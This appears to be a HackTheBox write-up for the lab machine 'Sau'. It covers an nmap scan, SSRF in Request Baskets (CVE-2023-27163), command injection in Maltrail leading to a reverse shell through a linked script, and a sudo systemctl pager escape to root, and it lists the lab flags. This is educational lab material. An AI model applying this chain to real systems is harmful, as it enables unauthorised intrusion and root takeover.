<div align="center">
  <h1>Sau - HackTheBox Writeup</h1>
  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/1ea2980b9dc2d11cf6a3f82f10ba8702.png" width="120" style="border-radius: 50%; border: 4px solid #9fef00;">

  <br>

  ### 📋 Machine Info
  **Name:** Sau | **IP:** 10.129.229.26 | **OS:** Linux (Ubuntu)  
  **Difficulty:** Easy | **Release:** July 8, 2023 | **Retired:** November 11, 2023
</div>

---

## Enumeration

### Nmap Scan

**Command Used:**

```bash
nu -d -p- -A 10.129.229.26
```

**Command Breakdown:**
- `nu` - Nmap Unleashed (enhanced nmap wrapper)
- `-d` - Enable debugging output
- `-p-` - Scan all 65,535 ports
- `-A` - Aggressive scan (OS detection, version detection, script scanning, traceroute)

**Results:**

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
80/tcp    filtered http
8338/tcp  filtered unknown
```

**Key Findings:**
- SSH on port 22 (likely not the entry point)
- Request Baskets web application on port 55555
- Filtered services on ports 80 and 8338 (internal services)

---

## Initial Access - SSRF via Request Baskets

### Service Identification

Accessing `http://10.129.229.26:55555` reveals **Request Baskets** - a web service for collecting and inspecting HTTP requests.

**Version Detection:**
- Application: Request Baskets
- Technology: Golang net/http server

### Understanding the SSRF Vulnerability

**CVE-2023-27163** - Server-Side Request Forgery (SSRF) in Request Baskets ≤ 1.2.1

**Impact:**
- Bypass firewall restrictions
- Access internal services (ports 80, 8338)
- Proxy requests through the vulnerable application

---

### Exploitation - SSRF

**Configure Basket Manually**

Before running the exploit, we need to set up the basket forwarding through the web interface:

1. **Access Request Baskets:** `http://10.129.229.26:55555`
2. **Create a basket** (or use existing one like "Root")
3. **Click the settings/gear icon ⚙️**
4. **Configure the basket settings:**

```
Forward URL: http://127.0.0.1:80
☑ Insecure TLS
☑ Proxy Response  
☑ Expand Forward Path
Basket Capacity: 200
```

5. **Click "Apply"**

**Why these settings matter:**
- **Forward URL: http://127.0.0.1:80** - Points to internal Maltrail service
- **Proxy Response** - Returns responses from internal service back to us
- **Expand Forward Path** - Ensures full URL paths are forwarded correctly
- **Insecure TLS** - Allows HTTP forwarding

---

## Remote Code Execution - Maltrail v0.53

### Vulnerability Identification

**Service:** Maltrail v0.53 (Malicious traffic detection system)  
**CVE:** CVE-2023-26035  
**Type:** Unauthenticated Command Injection

**Exploit Technique:**
```bash
username=;`command injection here`
```

### Exploitation Workflow

**Complete Attack Chain:**

```bash
# Step 1: Configure basket through web interface
# Go to http://10.129.229.26:55555
# Create/configure basket with Forward URL: http://127.0.0.1:80
# Enable: Proxy Response, Expand Forward Path, Insecure TLS

# Step 2: Start listener
nc -lvnp 4444

# Step 3: Run exploit
python3 ssrf_to_rce_sau.py 10.10.14.71 4444 http://10.129.229.26:55555
```

**The script automatically:**
- Creates a new random basket (or you can use your manually configured one)
- Sends the Maltrail CVE-2023-26035 payload
- Delivers reverse shell to your listener

**Result:** Reverse shell as user `puma`

```bash
$ whoami
puma
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

### User Flag

```bash
$ cd /home/puma
$ cat user.txt
facd3ec499913d059af511e9e2998101
```

---

## Privilege Escalation

### Enumeration

**Check sudo privileges:**

```bash
$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

**Critical Finding:** User can run `systemctl status trail.service` as root without password

### Vulnerability Analysis

**Issue:** Systemctl status uses a pager (less/more) to display output  
**Impact:** When run with sudo, the pager executes as root  
**Exploitation:** Pager escape sequences allow arbitrary command execution

**GTFOBins Reference:** [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

### Exploitation

**Attack Chain:**

1. Execute systemctl with sudo privileges
2. Pager opens as root
3. Use pager escape sequence to spawn shell

**Execution:**

```bash
$ sudo /usr/bin/systemctl status trail.service
```

**When the pager opens, type:**

```
!sh
```

**Alternative escape sequences:**
- `!/bin/bash`
- `!bash`
- `!/bin/sh`

**Result:**

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
# cd /root
# cat root.txt
b5f97d7af29274617be11cdb5061b021
```

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Reconnaissance - Nmap Scan                               │
│    └─> Port 55555: Request Baskets                          │
│    └─> Port 80: Filtered (Internal Maltrail)              │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. SSRF Exploitation - CVE-2023-27163                       │
│    └─> Create basket forwarding to 127.0.0.1:80           │
│    └─> Bypass firewall, access internal Maltrail            │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. RCE via Maltrail - CVE-2023-26035                        │
│    └─> Command injection in username parameter              │
│    └─> Reverse shell as user 'puma'                         │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. Privilege Escalation - Systemctl Pager Escape           │
│    └─> sudo /usr/bin/systemctl status trail.service         │
│    └─> Pager escape: !sh                                    │
│    └─> Root shell obtained                                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Vulnerabilities Summary

| Vulnerability | CVE | CVSS | Impact |
|---------------|-----|------|--------|
| Request Baskets SSRF | CVE-2023-27163 | 9.1 (Critical) | Access to internal services, firewall bypass |
| Maltrail Command Injection | CVE-2023-26035 | 9.8 (Critical) | Unauthenticated RCE as service user |
| Systemctl Sudo Misconfiguration | N/A | 7.8 (High) | Local privilege escalation to root |

---

## References & Further Reading

### Vulnerabilities
- [CVE-2023-27163 - Request Baskets SSRF](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
- [CVE-2023-26035 - Maltrail RCE](https://nvd.nist.gov/vuln/detail/CVE-2023-26035)
- [Request Baskets GitHub Issues](https://github.com/darklynx/request-baskets/issues/5)

### Exploitation Techniques
- [SSRF Bible - Wallarm](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [GTFOBins - Systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [Pager Escape Techniques](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)

### Tools
- [bl4ckarch's SSRF to RCE Script](https://github.com/bl4ckarch/ssrf_to_rce_sau)
- [Maltrail Official Repository](https://github.com/stamparm/maltrail)
- [Request Baskets](https://github.com/darklynx/request-baskets)

### Learning Resources
- [PortSwigger Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## Flags

**User Flag:** `facd3ec499913d059af511e9e2998101`  
**Root Flag:** `b5f97d7af29274617be11cdb5061b021`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security on systems you don't own.*

**Author:** Halfin  
**Date:** February 13, 2026  
**Platform:** HackTheBox
